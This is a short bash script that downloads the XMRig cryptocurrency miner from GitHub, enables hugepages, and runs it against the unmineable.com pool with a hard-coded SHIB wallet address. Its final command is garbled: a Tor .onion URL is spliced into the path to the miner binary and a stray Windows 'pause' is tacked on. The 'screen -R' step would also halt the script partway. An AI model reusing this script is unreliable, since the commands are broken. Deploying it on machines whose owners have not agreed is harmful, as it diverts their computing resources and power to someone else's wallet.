#!/bin/bash
clear
lscpu
apt install screen
screen -R xmr
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0/
sysctl -w vm.nr_hugepages=1280
.http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion//xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SHIB:0xca3938760d3ff3370ca4bd5ba5f9e727dbb198e8.ld001 -p x pause
